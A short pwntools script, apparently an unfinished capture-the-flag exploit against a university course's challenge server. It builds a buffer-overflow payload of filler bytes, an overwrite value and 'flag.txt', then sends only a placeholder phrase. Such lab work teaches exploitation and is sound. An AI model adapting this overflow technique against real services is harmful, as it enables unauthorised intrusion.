#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

aux = bytearray(b"aaaaaaaaaaaaaaaaaaaa")
aux.append(0x23)
aux.append(0x22)
aux.append(0xfc)
aux.append(0xfe)
aux.extend(b"flag.txt")
    


r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()